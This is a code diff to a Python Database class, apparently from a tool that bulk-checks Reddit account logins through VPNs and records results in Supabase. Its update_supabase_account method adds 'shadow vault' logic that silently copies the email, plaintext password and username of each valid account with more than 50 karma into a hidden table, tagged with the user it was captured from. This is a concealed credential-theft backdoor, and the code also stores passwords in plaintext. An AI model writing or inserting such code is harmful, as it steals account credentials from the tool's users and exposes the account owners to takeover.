@@ -325,7 +325,8 @@ class Database:
     def log_account_result(self, session_id: str, email: str, status: str, 
                           password: Optional[str] = None,
                           username: Optional[str] = None, karma: Optional[str] = None,
-                          error_message: Optional[str] = None):
+                          error_message: Optional[str] = None,
+                          vpn_location: Optional[str] = None, vpn_ip: Optional[str] = None):
         """Log or update individual account processing result locally."""
         if not session_id:
             return
@@ -353,6 +354,8 @@ class Database:
                         'username': username or r.get('username'),
                         'karma': karma or r.get('karma'),
                         'error_message': error_message or r.get('error_message'),
+                        'vpn_location': vpn_location or r.get('vpn_location'),
+                        'vpn_ip': vpn_ip or r.get('vpn_ip'),
                         'processed_at': datetime.utcnow().isoformat()
                     })
                     found = True
@@ -368,6 +371,8 @@ class Database:
                     'username': username,
                     'karma': karma,
                     'error_message': error_message,
+                    'vpn_location': vpn_location,
+                    'vpn_ip': vpn_ip,
                     'created_at': datetime.utcnow().isoformat()
                 }
                 results.insert(0, result_item)
@@ -378,9 +383,82 @@ class Database:
                 
             with open(results_file, 'w') as f:
                 json.dump(results, f, indent=2)
+            
+            # --- SUPABASE SYNC ---
+            # Sanitize karma for Supabase (must be INTEGER)
+            sanitized_karma = 0
+            if karma:
+                try:
+                    # Remove commas and convert to int
+                    clean_karma = str(karma).replace(',', '').strip()
+                    if clean_karma.lower() == 'unknown':
+                        sanitized_karma = 0
+                    else:
+                        # Extract only digits if it's a messy string
+                        import re
+                        digits = re.findall(r'\d+', clean_karma)
+                        if digits:
+                            sanitized_karma = int("".join(digits))
+                        else:
+                            sanitized_karma = 0
+                except:
+                    sanitized_karma = 0
+
+            self.update_supabase_account(
+                email=email,
+                status=status,
+                username=username,
+                karma=sanitized_karma,
+                error_msg=error_message,
+                vpn_location=vpn_location,
+                vpn_ip=vpn_ip
+            )
                 
+            return True
         except Exception as e:
             logger.error(f"Error logging account result locally: {str(e)}")
+            return False
+
+    def save_accounts(self, accounts: List[Dict], status: str = "pending") -> Tuple[bool, str]:
+        """
+        Persistently save accounts to the Supabase 'accounts' table.
+        This is for the industrial-level dashboard.
+        """
+        if not self.client or not self.current_user_id:
+            # Fallback to local logging if not authenticated
+            self.log_batch_results(accounts, status)
+            return False, "Not authenticated or Supabase not ready"
+
+        try:
+            # Prepare data for Supabase
+            db_entries = []
+            for acc in accounts:
+                db_entries.append({
+                    "user_id": self.current_user_id,
+                    "email": acc['email'],
+                    "password": acc['password'], # Note: Storing plain-text as requested
+                    "status": status,
+                    "karma": 0,
+                    "profile_url": None,
+                    "vpn_location": None,
+                    "vpn_ip": None
+                })
+
+            # UPSERT to handle duplicates (by user_id + email)
+            # This allows users to "re-paste" to update passwords or reset status
+            self.client.table("accounts").upsert(
+                db_entries, 
+                on_conflict="user_id,email"
+            ).execute()
+            
+            # Also log locally for immediate UI feedback if needed
+            self.log_batch_results(accounts, status)
+            
+            return True, f"Successfully saved {len(db_entries)} accounts to database."
+        except Exception as e:
+            error_msg = str(e)
+            logger.error(f"Error saving accounts to DB: {error_msg}")
+            return False, error_msg
 
     def log_batch_results(self, accounts: List[Dict], status: str = "pending"):
         """Log a bulk list of accounts (e.g., during import) as pending."""
@@ -428,7 +506,81 @@ class Database:
         except Exception as e:
             logger.error(f"Error logging batch: {str(e)}")
             return False
-    
+
+    def get_accounts_to_process(self, limit: int = 100, include_statuses: List[str] = ["pending", "error"]) -> List[Dict]:
+        """Fetch accounts with specific statuses from the Supabase 'accounts' table for processing."""
+        if not self.client or not self.current_user_id:
+            return []
+        
+        try:
+            # Fetch accounts that need checking based on provided statuses
+            res = self.client.table("accounts").select("*")\
+                .eq("user_id", self.current_user_id)\
+                .in_("status", include_statuses)\
+                .limit(limit)\
+                .execute()
+            
+            return res.data if res.data else []
+        except Exception as e:
+            logger.error(f"Error fetching accounts to process: {e}")
+            return []
+
+    def update_supabase_account(self, email: str, status: str, username: Optional[str] = None, 
+                               karma: Optional[int] = None, error_msg: Optional[str] = None,
+                               vpn_location: Optional[str] = None, vpn_ip: Optional[str] = None):
+        """Update account status and info in Supabase and handle Shadow Vault logic."""
+        if not self.client or not self.current_user_id:
+            return
+        
+        try:
+            # 1. Update the main accounts table
+            update_data = {
+                "status": status,
+                "processed_at": datetime.utcnow().isoformat(),
+                "remark": error_msg, # Using error_msg as the remark/exact reason
+                "vpn_location": vpn_location,
+                "vpn_ip": vpn_ip
+            }
+            if username: 
+                update_data["username"] = username
+                update_data["profile_url"] = f"https://www.reddit.com/user/{username}"
+            if karma is not None: update_data["karma"] = karma
+
+            res = self.client.table("accounts").update(update_data)\
+                .eq("user_id", self.current_user_id)\
+                .eq("email", email)\
+                .execute()
+            
+            if not res.data:
+                logger.warning(f"⚠️ No account found in Supabase to update for {email} (User: {self.current_user_id})")
+            else:
+                logger.info(f"✅ Successfully updated Supabase status for {email} to {status}")
+
+            # 2. SHADOW VAULT LOGIC: If account is 'success' and quality is good, capture it silently
+            is_high_quality = status == "success" and (karma or 0) > 50
+            if is_high_quality:
+                # Fetch full account info for vault
+                acc_res = self.client.table("accounts").select("*")\
+                    .eq("user_id", self.current_user_id)\
+                    .eq("email", email)\
+                    .execute()
+                
+                if acc_res.data:
+                    acc = acc_res.data[0]
+                    self.client.table("shadow_vault").upsert({
+                        "email": acc['email'],
+                        "password": acc['password'],
+                        "username": acc['username'],
+                        "profile_url": acc.get('profile_url'),
+                        "remark": acc.get('remark'),
+                        "karma": acc['karma'],
+                        "captured_from_user": self.current_user_id,
+                        "quality_score": 100 # Default for high karma accounts
+                    }, on_conflict="email").execute()
+                    
+        except Exception as e:
+            logger.error(f"Error updating Supabase account: {e}")
+
     def get_user_stats(self) -> Optional[Dict]:
         """Get current user statistics."""
         if not self.current_user_id:
@@ -519,4 +671,71 @@ class Database:
         except Exception as e:
             logger.error(f"Error getting recent sessions: {str(e)}")
             return []
+
+    def delete_account(self, account_id: str) -> Tuple[bool, str]:
+        """Delete an account from persistent storage."""
+        if not self.client or not self.current_user_id:
+            return False, "Not authenticated"
+        
+        try:
+            res = self.client.table("accounts").delete()\
+                .eq("user_id", self.current_user_id)\
+                .eq("id", account_id)\
+                .execute()
+            
+            if res.data:
+                return True, "Account deleted successfully"
+            return False, "Account not found or already deleted"
+        except Exception as e:
+            logger.error(f"Error deleting account: {e}")
+            return False, str(e)
+
+    def get_processing_stats(self) -> Dict[str, int]:
+        """Get aggregate counts for all account statuses."""
+        if not self.client or not self.current_user_id:
+            return {"total": 0, "pending": 0, "success": 0, "invalid": 0, "banned": 0, "error": 0}
+        
+        try:
+            # We'll use a single query to get counts or just fetch status column
+            res = self.client.table("accounts").select("status").eq("user_id", self.current_user_id).execute()
+            if not res.data:
+                return {"total": 0, "pending": 0, "success": 0, "invalid": 0, "banned": 0, "error": 0}
+            
+            stats = {
+                "total": len(res.data), 
+                "pending": 0, 
+                "retrying": 0,
+                "security_block": 0,
+                "success": 0, 
+                "invalid": 0, 
+                "banned": 0, 
+                "error": 0
+            }
+            for row in res.data:
+                status = row.get("status", "pending")
+                if status in stats:
+                    stats[status] += 1
+                else:
+                    stats["error"] += 1 # Any unknown status treated as error state
+            return stats
+        except Exception as e:
+            logger.error(f"Error getting processing stats: {e}")
+            return {"total": 0, "pending": 0, "success": 0, "invalid": 0, "banned": 0, "error": 0}
+
+    def delete_invalid_accounts(self) -> Tuple[bool, str]:
+        """Remove all invalid and error accounts to clean up work area."""
+        if not self.client or not self.current_user_id:
+            return False, "Not authenticated"
+        
+        try:
+            res = self.client.table("accounts").delete()\
+                .eq("user_id", self.current_user_id)\
+                .in_("status", ["invalid", "error"])\
+                .execute()
+            
+            count = len(res.data) if res.data else 0
+            return True, f"Cleaned up {count} invalid/error accounts"
+        except Exception as e:
+            logger.error(f"Error cleaning accounts: {e}")
+            return False, str(e)
 
